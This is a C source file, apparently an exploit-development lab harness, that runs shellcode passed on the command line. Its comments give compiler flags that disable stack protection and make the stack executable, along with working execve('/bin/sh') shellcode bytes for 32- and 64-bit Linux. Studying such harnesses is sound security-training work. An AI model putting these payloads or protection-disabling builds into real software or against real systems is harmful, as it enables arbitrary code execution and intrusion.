#include <stdio.h>
#include <string.h>
#include <unistd.h>

//  \x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54
// marche aussi

// Compilation :
// gcc -fno-stack-protector -z execstack -o wrapper64 wrapper/wrapper.c
// Ajouter -m32 si 32 bits ou -m64 si 64 bits (ce dernier est deviné avec le système)

// Commande :
// ./wrapper64 $(python2 -c 'print("\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05")')
// ./wrapper64 $(python2 -c 'print("shellcode")')

unsigned char code[] =
        "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
        "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

int main(int argc,  char *argv[]){
    if (argc<2){
        printf("usage ./wrapper {shellcode}");
        return 1;
    }

    char *shellcode = argv[1];

    size_t shellcode_len = strlen(shellcode);
    printf("Longueur shellcode : %ld octets\n", shellcode_len);

    // exécution
    int (*ret)() = (int(*)())shellcode;

    ret();

//    (*(void (*)())shellcode)();


}